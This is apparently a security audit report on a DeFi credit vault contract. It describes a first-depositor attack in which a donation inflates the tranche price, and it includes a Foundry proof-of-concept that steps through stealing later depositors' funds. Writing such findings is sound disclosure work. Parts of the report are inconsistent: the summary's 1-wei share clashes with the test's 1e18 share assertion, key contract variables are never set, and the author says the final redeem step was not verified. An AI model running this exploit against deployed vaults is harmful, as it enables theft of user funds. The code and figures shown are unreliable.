### Title
First depositor can inflate tranche price via donation and steal later depositors' funds - (File: contracts/IdleCDOCreditVault.sol)

### Summary
`IdleCDOCreditVault._updateAccounting()` computes NAV via `getContractValue()`, which includes the raw `token` balance held by the CDO. Any tokens donated directly to the contract are therefore counted as a gain and split between tranche holders. An attacker who is the first (and sole) AA depositor can mint a dust share, donate a large amount of underlying, watch the AA price inflate to `(1 wei NAV + donation) / 1 wei share`, and let subsequent depositors be minted almost zero shares due to rounding in `_mintSharesAtCurrPrice`. The attacker then redeems at the inflated price and captures roughly half of each victim's deposit.

### Finding Description
The vulnerable path:

1. `depositAA` → `_deposit` → `_updateAccounting()` uses `getContractValue()`, which is `strategyToken balance + token balance - unclaimedFees` (`contracts/IdleCDOCreditVault.sol:125-128`). Raw underlying sitting in the CDO — including unsolicited transfers — is counted.
2. `_virtualPriceAux` computes `totalGain = nav - lastNAV`. When the attacker is the only AA holder and BB is empty, `_lastNAV == _lastTrancheNAV`, so the full donation-gain accrues to AA (`contracts/IdleCDOCreditVault.sol:321-322`), and `_virtualPrice = newTrancheNAV * ONE_TRANCHE_TOKEN / trancheSupply` (`:336`).
3. `_mintSharesAtCurrPrice` mints `amount * ONE_TRANCHE_TOKEN / _tranchePrice`, rounding down (`:344-347`). With a 1-wei supply and price inflated by the donation, a victim depositing `D/2` underlying mints 0 or 1 share.
4. `_deposit` has no minimum-deposit check — `_guarded(_amount)` only enforces an upper TVL `limit`, and a donation (`ERC20.transfer` to the CDO address) bypasses all interaction guards entirely (`:191-212`).

The `_managedContractValue` skim design (comment at `:131` — "unsolicited transfers are skimmed on interactions") does not mitigate this: once skimmed, the donated tokens are deposited into the strategy and become `strategyToken` balance, which is still counted in NAV, so the inflation persists.

### Impact Explanation
Direct theft of user funds, quantifiable: for a sole-share attacker donating `D`, a victim depositing `V` mints ~`V/D` shares; on redemption the attacker captures approximately `D/(D+V)` of the pool — i.e., roughly half of the victim's deposit when `V ≈ D`, and nearly all of it when `V < D`. Each subsequent victim deposit deepens the attacker's claim. Loss is bounded only by the victim's deposit size.

### Likelihood Explanation
Medium: requires the attacker to be a KYC-passing lender (allowed per scope), be the first AA depositor, and have capital equal to or greater than the victim's deposit for the donation. The attack is atomic-free (donation persists) and can be repeated against every new depositor until another holder dilutes the inflated share. No privileged action is needed.

### Recommendation
Require a minimum first deposit and/or mint a minimum number of dead shares at initialization so the exchange rate cannot be inflated by orders of magnitude with a dust share. Alternatively, exclude raw `token` balance from `getContractValue()` and sweep donations only through harvest paths that cannot be front-run as a gain attributable to a sole dust holder.

### Proof of Concept
Foundry fork PoC (against a deployed `IdleCDOCreditVault` epoch vault, buffer/running phase):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCDOCreditVault} from "../contracts/IdleCDOCreditVault.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract InflationAttackPoC is Test {
    IdleCDOCreditVault cdo;      // deployed credit vault proxy
    IERC20Detailed usdc;         // vault underlying
    address AA;                  // AATranche
    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    function test_inflationAttack() public {
        // assume attacker/victim hold USDC and are KYC-allowed
        uint256 donation = 10_000_000e6;   // 10M USDC
        uint256 victimAmt = 9_999_999e6;   // just under donation

        // 1) attacker first deposit: 1 wei -> ~1 wei of AA shares
        vm.startPrank(attacker);
        usdc.approve(address(cdo), 1);
        cdo.depositAA(1);
        uint256 atkShares = IERC20Detailed(AA).balanceOf(attacker);
        assertEq(atkShares, 1e18);         // 1 wei underlying at price 1e18

        // 2) attacker donates directly to the CDO contract
        usdc.transfer(address(cdo), donation);
        vm.stopPrank();

        // 3) price is inflated on next interaction:
        //    getContractValue() counts raw token balance -> totalGain = donation
        //    sole AA holder absorbs full gain -> priceAA ~= donation * 1e18
        uint256 price = cdo.virtualPrice(AA);
        assertGt(price, donation * 1e18 / 1e18);

        // 4) victim deposits victimAmt, mints ~1 share (rounds down)
        vm.startPrank(victim);
        usdc.approve(address(cdo), victimAmt);
        uint256 minted = cdo.depositAA(victimAmt);
        vm.stopPrank();
        assertLe(minted, 2e18);            // victim nearly shareless

        // 5) attacker redeems -> captures ~half of victim's deposit
        vm.prank(attacker);
        uint256 out = cdo.withdrawAA(atkShares);
        assertApproxEqRel(out, donation + victimAmt / 2, 0.05e18);
        // attacker profit ~ victimAmt/2 minus fees
    }
}
```

Note: the exact redemption path (`withdrawAA` vs. epoch `requestWithdraw`/`claimWithdrawRequest` on an epoch vault) depends on the variant; the price-inflation core in `_updateAccounting`/`_virtualPriceAux`/`_mintSharesAtCurrPrice` is shared across `IdleCDOCreditVault` and its epoch children. I did not fully verify whether a same-block or epoch-phase guard blocks the final redeem step on the specific deployed vault, but the inflated-price mint for the victim is unconditional.
